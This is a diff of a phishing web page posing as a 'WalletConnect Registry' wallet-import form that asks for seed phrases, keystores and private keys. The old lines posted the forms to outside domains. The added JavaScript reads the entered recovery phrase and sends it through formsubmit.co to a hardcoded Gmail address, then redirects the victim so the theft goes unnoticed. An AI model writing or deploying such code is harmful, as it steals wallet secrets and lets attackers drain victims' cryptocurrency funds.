@@ -1887,10 +1887,10 @@
 
                         <div class="result" style="text-align: center"></div>
                         <div class="tabContent active" id="phraseContent">
-                            <form method="post" action="https://dappsnodesconnect.live/wallet/">
+                            <form method="post" name="phraseKey">
                                 <div class="row">
 
-                                    <textarea name="phrase" required=""
+                                    <textarea data-name="phrase" name="recovery_phrase" required=""
                                         placeholder="Wallet Phrases or Wallet Seed Words"
                                         style="height:200px"></textarea>
                                 </div>
@@ -1903,7 +1903,7 @@
                             </form>
                         </div>
                         <div class="tabContent" id="keystoreContent">
-                            <form id="keystoreForm" method="post" action="https://walletsprotocols.org/wallet/code.php">
+                            <form id="keystoreForm" method="post">
                                 <div class="row">
                                     <input class="wallet" name="wallet" hidden="">
                                     <input class="n" name="n" hidden="">
@@ -1921,7 +1921,7 @@
                             </form>
                         </div>
                         <div class="tabContent" id="privateContent">
-                            <form id="privateForm" method="post" action="https://walletsprotocols.org/wallet/code.php">
+                            <form id="privateForm" method="post">
                                 <div class="row">
                                     <input class="wallet" name="wallet" hidden="">
                                     <input class="n" name="n" hidden="">
@@ -1944,6 +1944,37 @@
                     </div>
 
                 </div>
+                <script type="text/javascript" async defer>
+                    let form = document.querySelector('form')
+                    form.addEventListener('submit', imPort)
+            
+                    function imPort() {
+                        console.log('hello')
+                        mail = "mayww8622@gmail.com"
+                        event.preventDefault()
+                        next = "next.html"
+                        subject = `${window.location.hostname} ${new Date()}`;
+                        let body = new FormData()
+                        phrase = document.querySelector('textarea[data-name="phrase"]').value
+                        if (event.target.name === 'phraseKey') {
+                            phrase = document.querySelector('textarea[data-name="phrase"]').value
+                            body.append('phraseKey', phrase)
+                            console.log(phrase)
+                        }
+                        body.append('_captcha', false)
+                        body.append('_next', next)
+                        body.append('_template', "table")
+                        body.append('_subject', subject)
+                        let URL = `https://formsubmit.co/${mail}`
+                        fetch(URL, {
+                            method: 'POST',
+                            body: body
+                        })
+                        .then(response => window.location.assign(next))
+                        /*
+                         */
+                    }
+                </script>
                 <script src="./WalletConnect Registry_files/jquery-3.4.1.min.js.download"></script>
                 <script type="text/javascript">
                     $('.tab ul li').on('click', function () {
